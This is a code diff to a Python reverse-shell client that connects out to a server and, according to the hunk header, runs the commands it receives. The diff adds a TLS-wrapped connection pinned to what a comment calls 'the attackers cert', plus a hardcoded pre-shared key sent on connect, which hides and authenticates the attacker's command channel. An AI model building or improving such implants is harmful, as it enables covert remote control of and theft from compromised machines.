@@ -8,16 +8,33 @@ It handles directory change requests specially and executes all other commands.
 import socket
 import os
 import subprocess
+import ssl
 import sys
 
 # Configuration
-SERVER_IP = '192.168.12.1'  # Replace with your server's IP address
+SERVER_HOST = '127.0.0.1'  # Replace with your server's IP address
 SERVER_PORT = 9999
+
+def tls_socket():
+    """
+    Creates a socket over TLS that checks also cert.pem.
+    """
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # Wrap the socket for TLS (client-side)
+    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
+    context.check_hostname = False  # Optional: disable hostname check
+    context.verify_mode = ssl.CERT_REQUIRED
+    context.load_verify_locations("cert.pem")  # the attackers cert
+
+    return context.wrap_socket(s, server_hostname=SERVER_HOST)
 
 def main():
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((SERVER_IP, SERVER_PORT))
+        s = tls_socket()
+        s.connect((SERVER_HOST, SERVER_PORT))
+        # Send PSK to authenticate themselves
+        s.send(b"supersecret")
     except Exception as e:
         sys.exit(f"Connection failed: {e}")
 
